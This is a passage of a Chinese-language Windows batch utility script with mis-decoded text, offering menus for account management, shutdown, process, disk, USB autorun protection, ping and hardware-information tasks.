net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set xiougaimima=
set xinmima=
set /p "xiougaimima=������Ҫ�޸ĵ��û���: "
set /p "xinmima=������������: "
cls
net user !xiougaimima! !xinmima!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.6
title �鿴�û���Ϣ!system!
cls
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set chakanyonghuxinxi=
set /p "chakanyonghuxinxi=������Ҫ�鿴���û���: "
cls
net user !chakanyonghuxinxi!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.7
title �����˻�!system!
cls
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set jhzh=
set /p "jhzh=������Ҫ�������û���: "
cls
net user !jhzh! /active:yes
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.8
title ͣ���˻�!system!
cls
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set tyzh=
set /p "tyzh=������Ҫ�������û���: "
cls
net user !tyzh! /active:no
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:22
cls
start gpedit.msc
goto memuv2
:guanji
setlocal
title �ػ�ѡ��!system!
set "cho=1234567890"
color 0a
cls
!hx!
echo;[1]�ػ�
echo;[2]����
echo;[3]ע��
echo;[4]����ϵͳ�ػ�
echo;[5]�������߹���
echo;[6]�ر����߹���
echo;[7]��ʾϵͳ�Ͽ��õ�˯��״̬
echo;[8]����
echo;[9]ѭ����ʾ���Ѽ�ʱ�����Դ����
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto guanji.1)
if "!shuru!" equ "2" (goto guanji.2)
if "!shuru!" equ "3" (goto guanji.3)
if "!shuru!" equ "4" (goto guanji.4)
if "!shuru!" equ "5" (goto guanji.6)
if "!shuru!" equ "6" (goto guanji.7)
if "!shuru!" equ "7" (goto guanji.8)
rem if "!shuru!" equ "8" (tsdiscon)
if "!shuru!" equ "8" (rundll32.exe user32.dll LockWorkStation)
if "!shuru!" equ "9" (goto guanji-9)
if "!shuru!" equ "10" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto guanji
:guanji.1
title �ػ�!system!
cls
set guanjidaojishi=
set /p "guanjidaojishi=�����ùػ�����ʱ����Ч��Χ(0-315360000)��(e=����): "
if /i "!guanjidaojishi!" equ "e" (endlocal&goto guanji)
call :checkvar guanjidaojishi num jg
if "!jg!" equ "0" (
	set /p =������Ч���֣�<nul
	call :out 2
	goto guanji.1
)
shutdown /s /f /t !guanjidaojishi!
endlocal
goto guanji
:guanji.2
title ����!system!
cls
set chongqidaojishi=
set /p "chongqidaojishi=��������������ʱ����Ч��Χ(0-315360000)��(e=����): "
if "!chongqidaojishi!" equ "e" (endlocal&goto guanji)
call :checkvar chongqidaojishi num jg
if "!jg!" equ "0" (
	set /p =������Ч���֣�<nul
	call :out 2
	goto guanji.2
)
shutdown /r /f /t !chongqidaojishi!
endlocal
goto guanji
:guanji.3
title ע��!system!
cls
set zhuxiao=
set /p "zhuxiao=�Ƿ�����ע��(y/n): "
if /i "!zhuxiao!" equ "y" (logoff&exit 0)
if /i "!zhuxiao!" equ "n" (endlocal&goto guanji)
set /p =��������ȷ��ѡ�<nul
call :out 2
goto guanji.3
:guanji.4
title ����ϵͳ�ػ�!system!
cls
shutdown /a
call :out 2
endlocal
goto guanji
:guanji.6
title ��������!system!
cls
set size=
set /p "size=���������ļ�ռ�����ڴ����(40~100)(Ĭ��100)(e=����): "
if /i "!size!" equ "e" (endlocal&goto guanji)
call :checkvar size num jg
if "!jg!" equ "0" (
	set /p =������Ч���֣�<nul
	call :out 2
	goto guanji.6
)
if !size! geq 40 (
	if !size! leq 100 (
		powercfg /h /size !size!
		set /p =�ѿ������߹���<nul
		call :out 2
		endlocal
		goto guanji
	)
)
set /p =������Ч���֣�<nul
call :out 2
goto guanji.6
:guanji.7
title �ر�����!system!
cls
powercfg -h off
set /p =�ѹر����߹���<nul
call :out 2
endlocal
goto guanji
:guanji.8
title ��ʾϵͳ�Ͽ��õ�˯��״̬!system!
cls
powercfg -a
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto guanji
:guanji-9
title ѭ����ʾ���Ѽ�ʱ�����Դ����!system!
cls
powercfg /requests
powercfg /waketimers
!hx!
echo;��e���ز˵�
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (endlocal&goto guanji)
goto guanji-9
:23
setlocal
title DOS���������!system!
set cho=1234560
cls
!hx!
echo;[1]��ʾ���н���
echo;[2]��ʾÿ�����̵ķ���
echo;[3]��ʾ����·��
echo;[4]��ʾ������ϸ��Ϣ
echo;[5]��ʾ���̵�TCP/UDP����
echo;[6]ѭ����ʾCPUռ�����������ٶ�
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 23.1)
if "!shuru!" equ "2" (goto 23.2)
if "!shuru!" equ "3" (goto 23.6)
if "!shuru!" equ "4" (goto 23.10)
if "!shuru!" equ "5" (goto 23.3)
if "!shuru!" equ "6" (goto 23.4)
if "!shuru!" equ "7" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
endlocal
goto 23
:23.1
cls
tasklist
!hx!
set jcjs=
set /p "jcjs=����Ҫ�����Ľ���PID������(e=����)(f=ˢ��): "
if not defined jcjs (goto 23.1)
if /i "!jcjs!" equ "f" (goto 23.1)
if /i "!jcjs!" equ "e" (endlocal&goto 23)
taskkill /f /im !jcjs!
call :out 2
goto 23.1
:23.2
cls
tasklist /svc
!hx!
set jcjs=
set /p "jcjs=����Ҫ�����Ľ���PID������(e=����)(f=ˢ��): "
if not defined jcjs (goto 23.2)
if /i "!jcjs!" equ "f" (goto 23.2)
if /i "!jcjs!" equ "e" (endlocal&goto 23)
taskkill /f /im !jcjs!
call :out 2
goto 23.2
:23.6
title ��ʾ����·��!system!
cls
tasklist
!hx!
set jclj=
set /p "jclj=����Ҫ��ʾ�Ľ���PID(e=����)(f=ˢ��): "
if not defined jclj (goto 23.6)
if /i "!jclj!" equ "f" (goto 23.6)
if /i "!jclj!" equ "e" (endlocal&goto 23)
tasklist /fi "pid eq !jclj!"|findstr /i "!jclj!"||(
	set /p =û�д˽���<nul
	call :out 2
	goto 23.6
)
cls
for /f "tokens=2 delims==" %%a in ('"wmic process where processid=!jclj! get executablepath /value"') do (
	set "jclj1=%%a"
	set "jclj1=!jclj1:~0,-1!"
)
echo;�ļ�·��: !jclj1!
!hx!
echo;(e=����)(d=���ļ�λ��)
set cho=ed
!sel!
if "!shuru!" equ "1" (endlocal&goto 23)
if "!shuru!" equ "2" (goto 23.8)
if /i "!shuru!" equ "e" (endlocal&goto 23)
if /i "!shuru!" equ "d" (goto 23.8)
set /p =��������ȷ��ѡ�<nul
call :out 2
goto 23.6
:23.8
explorer /select,"!jclj1!"
endlocal
goto 23
:23.10
title ��ʾ������ϸ��Ϣ!system!
cls
!hx!
tasklist
!hx!
set jclj=
set /p "jclj=����Ҫ��ʾ�Ľ���PID(e=����)(f=ˢ��): "
if not defined jclj (goto 23.10)
if /i "!jclj!" equ "f" (goto 23.10)
if /i "!jclj!" equ "e" (endlocal&goto 23)
tasklist /fi "pid eq !jclj!"|findstr /i "!jclj!"||(
	set /p =û�д˽���<nul
	call :out 2
	goto 23.10
)
cls
!hx!
for /f "delims=" %%a in ('"wmic process where processid=!jclj! get * /value"') do (
	set "var=%%a"
	set "var=!var:~0,-1!"
	set "!var!">nul
)
if defined name (echo;����:		!name!)
if defined parentprocessid (echo;��ϵPID:	!parentprocessid!)
if defined threadCount (echo;�߳���:		!threadCount!)
if defined handlecount (echo;�����:		!handlecount!)
if defined workingsetsize (
	call :xdwjs !workingsetsize! zj workingsetsize
	echo;��������С:	!workingsetsize!
)
if defined pagefileusage (
	call :xdwjs !pagefileusage! kb pagefileusage
	echo;ҳ���ļ�ʹ��:	!pagefileusage!
)
if defined creationdate (echo;������������:	!creationdate:~0,4!��!creationdate:~4,2!��!creationdate:~6,2!�� !creationdate:~8,2!:!creationdate:~10,2!:!creationdate:~12,2!)
if defined priority (echo;���ȼ�:		!priority!)
if defined sessionid (echo;�ỰID:		!sessionid!)
if defined readoperationcount (echo;��ȡ������:	!readoperationcount!)
if defined readtransfercount (
	call :xdwjs !readtransfercount! zj readtransfercount
	echo;��ȡ������:	!readtransfercount!
)
if defined writeoperationcount (echo;д�������:	!writeoperationcount!)
if defined writetransfercount (
	call :xdwjs !writetransfercount! zj writetransfercount
	echo;д�봫����:	!writetransfercount!
)
if defined executablepath (echo;·��:		!executablepath!)
if defined commandline (
	echo;������:		!commandline!
) else (
	echo;������:
	wmic process where processid=!jclj! get commandline /format:value
)
tasklist /fi "pid eq !jclj!" /m
ver
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 23
:23.3
title ��ʾTCP/UDP����!system!
cls
netstat -aon
!hx!
set �ַ���=
set /p "�ַ���=����Ҫ���ҵ��ַ���(e=����)(f=ˢ��): "
if not defined �ַ��� (goto 23.3)
if "!�ַ���!" equ "f" (goto 23.3)
if /i "!�ַ���!" equ "e" (endlocal&goto 23)
cls
netstat -aon|findstr /i /c:"!�ַ���!"
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 23
:23.4
color 0f
set ysbak=97;40m
title ѭ����ʾCPUռ�����������ٶ�!system!
cls
echo;���ڻ�ȡ������Ϣ...
for /f "tokens=2 delims==" %%a in ('Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get name /value') do (
    set "netcard=%%a"
	set "netcard=!netcard:~0,-1!"
)
for /f "tokens=2 delims==" %%a in ('wmic cpu get numberOflogicalprocessors /value') do (
    set "corenum=%%a"
	set "corenum=!corenum:~0,-1!"
    set /a "tghs=corenum*2+4+2"
)
for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do (
    set "cpu=%%a"
	set "cpu=!cpu:~0,-1!"
)
cls
:23.4.1
(
set xh=
for /f "tokens=2 delims==" %%a in ('Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get BytesReceivedPersec^,BytesSentPersec /value') do (
    set /a "xh+=1"
    if "!xh!" equ "1" (
        set "downspeed=%%a"
		set "downspeed=!downspeed:~0,-1!"
	)
    if "!xh!" equ "2" (
        set "upspeed=%%a"
		set "upspeed=!upspeed:~0,-1!"
        for /f "skip=%tghs% tokens=2 delims==" %%a in ('Wmic Path Win32_PerfFormattedData_PerfOS_Processor Get PercentIdleTime /value') do (
            set "bfb=%%a"
			set "bfb=!bfb:~0,-1!"
			set /a "lyl=100-bfb"
		)
	)
)
call :xdwjs !upspeed! b upspeed
call :xdwjs !downspeed! b downspeed
echo;!netcard!
echo;
(echo;�ϴ��ٶ�:  !upspeed!/s �����ٶ�:   !downspeed!/s   	)
echo;
echo;!cpu!
echo;
set /p =CPU����������:  <nul
if !lyl! leq 25 (
    call :rgb 12.12.12 0.255.0 !lyl!
) else (
    if !lyl! leq 50 (
        call :rgb 12.12.12 255.255.0 !lyl!
	) else (
        if !lyl! leq 75 (
            call :rgb 12.12.12 255.127.0 !lyl!
		) else (
            call :rgb 12.12.12 255.0.0 !lyl!
		)
	)
)
set /p =%%  <nul
echo;
!hx!
echo;��e���ز˵�
set /p =!cswz!s!cswz!0;0H<nul
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (
	endlocal
	goto 23
)
goto 23.4.1
)
:24
setlocal
title �ļ�ϵͳ��Ϣ��ѯ!system!
set "cho=1234560"
cls
!hx!
echo;[1]�г�����������
echo;[2]��ѯһ��������������
echo;[3]��ѯ����Ϣ
echo;[4]��ѯNTFS����Ϣ
echo;[5]��ѯREFS����Ϣ
echo;[6]��ѯ������Ϣ
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 24.1)
if "!shuru!" equ "2" (goto 24.2)
if "!shuru!" equ "3" (goto 24.3)
if "!shuru!" equ "4" (goto 24.4)
if "!shuru!" equ "5" (goto 24.5)
if "!shuru!" equ "6" (goto 24.6)
if "!shuru!" equ "7" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p=��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 24
:24.1
titel �г�����������!system!
cls
fsutil fsinfo drives
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 24
:24.2
title ��ѯһ��������������!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=������Ҫ��ѯ��������: "
if not defined qdqlx (goto 24.2)
cls
fsutil fsinfo drivetype !qdqlx!:
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 24
:24.3
title ��ѯ����Ϣ!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=������Ҫ��ѯ��������: "
if not defined qdqlx (goto 24.3)
cls
fsutil fsinfo volumeinfo !qdqlx!:
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 24
:24.4
title ��ѯNTFS����Ϣ!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=������Ҫ��ѯ��������: "
if not defined qdqlx (goto 24.4)
cls
fsutil fsinfo ntfsinfo !qdqlx!:
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 24
:24.5
title ��ѯREFS����Ϣ!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=������Ҫ��ѯ��������: "
if not defined qdqlx (goto 24.5)
cls
fsutil fsinfo refsinfo !qdqlx!:
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 24
:24.6
title ��ѯ������Ϣ!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=������Ҫ��ѯ��������: "
if not defined qdqlx (goto 24.6)
cls
fsutil fsinfo sectorinfo !qdqlx!:
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 24
:25
setlocal
title ����ָ����С���ļ�!system!
cls
set cjlj=
set /p "cjlj=�������ļ�·��(e=����): "
if not defined cjlj (endlocal&goto 25)
if /i "!cjlj!" equ "e" (endlocal&goto memuv2)
set cjdx=
set /p "cjdx=�������ļ���С(��λ:�ֽ�)(e=����): "
if not defined cjdx (endlocal&goto 25)
if /i "!cjdx!" equ "e" (endlocal&goto memuv2)
call :checkvar cjdx num jg
if "!jg!" equ "0" (endlocal&goto 25)
fsutil file createnew !cjlj! !cjdx!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto memuv2
:26
setlocal
title ����U�̲���!system!
set "cho=120"
cls
echo;�˹������U�̽������ߣ�����autorun���͵Ĳ����Զ�����
!hx!
echo;[1]����U������
echo;[2]ȡ��U������
echo;[0]���ز˵�
!hx!
rem choice /c 120 /n /m ���������ѡ��:
!sel!
if "!shuru!" equ "1" goto 26(1)
if "!shuru!" equ "2" goto 26(2)
if "!shuru!" equ "3" endlocal&goto memuv2
if "!shuru!" equ "0" endlocal&goto memuv2
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 26
:26(1)
title ����U������!system!
cls
echo;�����������ƶ�����...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%l in (!sypf!) do (
	fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&goto 26-3
)
cls
echo;û���ҵ����ƶ�����
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 26
:26-3
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%l in (!sypf!) do (
	fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&(
		takeown/f %%lautorun.inf
		echo;y|cacls %%lautorun.inf /t /c /p everyone:f
		attrib -s -h -r %%lautorun.inf
		del /f /q %%lautorun.inf
		rd /s /q %%lautorun.inf
		md %%lautorun.inf
		md "%%lautorun.inf\�����ļ��У�����ɾ��"
		md "%%lautorun.inf\�����ļ��У�����ɾ�� / "
		echo;y|cacls %%lautorun.inf /t /c /p everyone:r
	)
) 2>nul
echo;
!hx!
echo;U���������
set /p =�����������<nul&pause>nul
endlocal
goto 26
:26(2)
title ȡ��U������!system!
cls
echo;�����������ƶ�����...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%m in (!sypf!) do (
	fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&goto 26-4
)
cls
echo;û���ҵ����ƶ�����
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 26
:26-4
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%m in (!sypf!) do (
	fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&(
		takeown/f %%mautorun.inf
		echo;y|cacls %%mautorun.inf /t /c /p everyone:f
		attrib -s -h -r %%mautorun.inf
		del /f /q %%mautorun.inf
		rd /s /q %%mautorun.inf
	)
) 2>nul
!hx!
echo;ȡ��U���������
set /p =�����������<nul&pause>nul
endlocal
goto 26
:27
setlocal
title ������Ƭ����!system!
cls
!hx!
echo;[1]�������д���
echo;[0]���ز˵�
!hx!
fsutil fsinfo drives
!hx!
set fenxi=
set /p "fenxi=��������Ҫ�������̷�:"
if "!fenxi!" equ "1" (goto 27.1)
if "!fenxi!" equ "0" (endlocal&goto memuv2)
cls
defrag /a !fenxi!:
!hx!
:27.3
set zhengli=
set /p "zhengli=�Ƿ�ʼ������Ƭ����(y/n):"
if /i "!zhengli!" equ "y" (goto 27.2)
if /i "!zhengli!" equ "n" (endlocal&goto 27)
echo;��������ȷ��ѡ�
call :out 2
goto 27.3
:27.1
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
if /i "!system:~11,2!" equ "XP" (
	for %%n in (!sypf!) do (defrag /v /x %%n)
)
for %%n in (!sypf!) do (defrag /u /v /x %%n)
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 27
:27.2
cls
defrag /u /v /x !fenxi!:||defrag /v /x !fenxi!:
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 27
:28
setlocal
title һ��ɾ�����ļ���!system!
cls
echo;ע��:�����ϵͳ�̽��в������ܻᱻɱ���������
!hx!
fsutil fsinfo drives
!hx!
set caozuo=
set /p "caozuo=��������Ҫ�������̷���·��: "
if not defined caozuo (
	endlocal
	goto 28
)
call :strlen caozuo jg
if "!jg!" equ "1" (
	set "caozuo=!caozuo!:\"
) else (
	for /f "delims=" %%a in ("!caozuo!") do (
		set "caozuo=%%~fa"
		dir /ad "!caozuo!">nul 2>nul||(
			echo;·�� "!caozuo!" ����һ���ļ���
			timeout /t 2 /nobreak>nul
			endlocal
			goto 28
		)
	)
)
cls
echo;���Everything�İ�װ·��������״̬...
for /f "skip=2 tokens=3 delims= " %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\voidtools\Everything" /v InstallLocation') do (
	set "EverythingInstallPath=%%a"
)
if exist "!EverythingInstallPath!\Everything.exe" (
	tasklist /fi "status eq running" /fi "username eq "%username%"" /fi "imagename eq everything.exe"|find /i "Everything.exe"&&(
		if exist "!EverythingInstallPath!\es.exe" (
			cls
			echo;�����������ļ���...     �ļ�Խ������ʱ��Խ��
			goto loop1
		)
	)
	cls
	echo;�����������ļ���...     �ļ�Խ������ʱ��Խ��
	goto loop2
)
:loop1
set empty=0
for /f "delims=" %%o in ('""!EverythingInstallPath!\es.exe" "!caozuo!" empty: ^!attrib:l"') do (
	rd /q "%%o"&&(
		set empty=1
		echo;��ɾ�����ļ��� "%%o"
	)
)
timeout /t 2 /nobreak>nul
if "!empty!" equ "1" (goto loop1)
goto 28.1
:loop2
for /f "delims=" %%o in ('"dir /a /s /b /ad-l "!caozuo!"|sort /r"') do (
	rd /q "%%o"2>nul&&(
		echo;��ɾ�����ļ��� "%%o"
	)
)
:28.1
!hx!
echo;���ļ���ɾ�����
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:29
setlocal
title ping���������ӳ�!system!
cls
if exist "%systemroot%\system32\curl.exe" (
	ping /n 1 www.baidu.com>nul
	if "!errorlevel!" equ "0" (
		rem set /p =����IPV4��ַ: <nul
		rem curl https://4.ipw.cn
		rem curl https://ipv4.ip.sb
		curl https://myip.ipip.net
		set /p =<nul
		echo;
	)
	ping /n 1 240c::6666>nul
	if "!errorlevel!" equ "0" (
		set /p =����IPV6��ַ: <nul
		curl https://6.ipw.cn
		rem curl https://ipv6.ip.sb
		echo;
	)
)
echo;
set ping=
set pingcishu=
set /p "ping=������Ŀ��IP������ַ: "
set /p "pingcishu=������ping����: "
echo;
echo;���ڲ���!ping!�������ӳ�...
ping /n !pingcishu! !ping! /a
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:30
setlocal
title Ӳ�����!system!
cls
for /f "tokens=2 delims==" %%a in ('Wmic OS Get LastBootUpTime /value') do (
    set "systemstarttime=%%a"
    echo;ϵͳ����ʱ��:	!systemstarttime:~0,4!��!systemstarttime:~4,2!��!systemstarttime:~6,2!�� !systemstarttime:~8,2!:!systemstarttime:~10,2!:!systemstarttime:~12,2!
    echo;
)
for /f "tokens=2 delims==" %%a in ('Wmic OS Get InstallDate /value') do (
    set "systeminstalltime=%%a"
    echo;ϵͳ��װ����:	!systeminstalltime:~0,4!��!systeminstalltime:~4,2!��!systeminstalltime:~6,2!�� !systeminstalltime:~8,2!:!systeminstalltime:~10,2!:!systeminstalltime:~12,2!
    echo;
)
set cs=
for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =CPU:<nul
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('wmic cpu get numberofcores /value') do (
	for /f "tokens=2 delims==" %%b in ('wmic cpu get numberOflogicalprocessors /value') do (
		set "var1=%%a"
		set "var2=%%b"
		echo;		!var1:~0,-1!���� !var2:~0,-1!�߳�
		echo;
	)
)
set cs=
set /p =CPUID:<nul
for /f "tokens=2 delims==" %%a in ('"wmic cpu get processorid /value 2>nul"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
set ch=
for /f "tokens=2 delims==" %%a in ('wmic path win32_cachememory get maxcachesize /value') do (
    set /a "ch+=1"
	set dw=0
    if "!ch!" equ "1" (
		call :xdwjs %%a kb dw
		echo;һ������:	!dw!
		echo;
	) else (
        if "!ch!" equ "2" (
            call :xdwjs %%a kb dw
			echo;��������:	!dw!
			echo;
		) else (
            if "!ch!" equ "3" (
	    		call :xdwjs %%a kb dw
	    		echo;��������:	!dw!
	    		echo;
			) else (
                if "!ch!" equ "4" (
                    call :xdwjs %%a kb dw
	    			echo;�ļ�����:	!dw!
	    			echo;
				)
			)
		)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('wmic cpu get currentclockspeed /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =CPU��Ƶ:<nul
			echo;	!var:~0,-1! MHz
		) else (
			echo;		!var:~0,-1! MHz
		)
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('wmic cpu get datawidth /value') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;����λ��: 	!var:~0,-1! bit
		echo;
	)
)
for /f "tokens=2 delims==" %%a in ('wmic cpu get extclock /value') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;��Ƶ: 		!var:~0,-1! MHz
	)
)
!hx!
for /f "tokens=2 delims==" %%a in ('wmic baseboard get manufacturer /value') do (
	set "var=%%a"
	echo;����������:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic baseboard get product /value') do (
	set "var=%%a"
	echo;�����ͺ�:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('Wmic Csproduct Get Uuid /value') do (
	set "var=%%a"
	echo;����UUID:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic bios get manufacturer /value') do (
	set "var=%%a"
	echo;BIOS������:	!var:~0,-1!
	echo;
)

for /f "tokens=2 delims==" %%a in ('wmic bios get smbiosbiosversion /value') do (
	set "var=%%a"
	echo;BIOS�汾:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic bios get releasedate /value') do (
	set "bioszzrq=%%a"
	echo;BIOS��������: 	!bioszzrq:~0,4!��!bioszzrq:~4,2!��!bioszzrq:~6,2!��
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('wmic desktopmonitor get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =��ʾ���ͺ�:<nul
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic desktopmonitor get monitormanufacturer /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =��ʾ��������:<nul
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get currenthorizontalresolution /value') do (
	for /f "tokens=2 delims==" %%b in ('wmic path win32_videocontroller get currentverticalresolution /value') do (
		set /a "cs+=1"
		set "var1=%%a"
		set "var2=%%b"
		if "!cs!" equ "1" (
			set /p =�ֱ���:<nul
			echo;		!var1:~0,-1! x !var2:~0,-1!
		) else (
			echo;			!var1:~0,-1! x !var2:~0,-1!
		)
	)
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =�Կ�:<nul
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get adapterram /value') do (
	set /a "cs+=1"
	set dw=0
	if "!cs!" equ "1" (
		call :xdwjs %%a b dw
		set /p =�Դ�����:<nul
		echo;	!dw!
	) else (
		call :xdwjs %%a b dw
		echo;		!dw!
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get videomodedescription /value') do (
	set "var=%%a"
	echo;��ǰ��ʾģʽ: 	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get currentrefreshrate /value') do (
	set "var=%%a"
	echo;��ǰˢ����: 	!var:~0,-1! Hz
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get driverdate /value') do (
	set "qdrq=%%a"
	echo;��������: 	!qdrq:~0,4!��!qdrq:~4,2!��!qdrq:~6,2!��
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get driverversion /value') do (
	set "var=%%a"
	echo;�����汾: 	!var:~0,-1!
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('wmic diskdrive get model /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =Ӳ���ͺ�:<nul
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=0
for /f "delims=" %%a in ('"wmic diskdrive get interfacetype^,size^,totalsectors^,partitions^,firmwarerevision /value 2>nul"') do (
	set "var=%%a"
	set "var=!var:~0,-1!"
	if defined var (
		if "!cs!" equ "0" (echo;�̼��汾	�ӿ�����	Ӳ������	��������	������)
		set /a "cs+=1"
		set "!var!">nul
		if "!cs!" equ "5" (
			call :xdwjs !size! b size
			call :strlen firmwarerevision cd
			if !cd! lss 8 (
				set "dsp=!firmwarerevision!		"
			) else (
				set "dsp=!firmwarerevision!	"
			)
			call :strlen interfacetype cd
			if !cd! lss 8 (
				set "dsp=!dsp!!interfacetype!		"
			) else (
				set "dsp=!dsp!!interfacetype!	"
			)
			call :strlen size cd
			if !cd! lss 8 (
				set "dsp=!dsp!!size!		"
			) else (
				set "dsp=!dsp!!size!	"
			)
			call :strlen totalsectors cd
			if !cd! lss 8 (
				set "dsp=!dsp!!totalsectors!		"
			) else (
				set "dsp=!dsp!!totalsectors!	"
			)
			call :strlen partitions cd
			if !cd! lss 8 (
				set "dsp=!dsp!!partitions!"
			) else (
				set "dsp=!dsp!!partitions!"
			)
			echo;!dsp!
			set cs=
		)
	)
)
fsutil fsinfo drives
echo;
for /f "delims=" %%a in ('wmic logicaldisk get name^,volumename^,description^,filesystem^,size^,freespace') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;!var:~0,-1!
	)
)
!hx!
set cs=
set /p =��ӡ��������:<nul
for /f "tokens=2 delims==" %%a in ('Wmic Printer where "Default='TRUE'" get caption /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
set /p =��ӡ���ͺ�:<nul
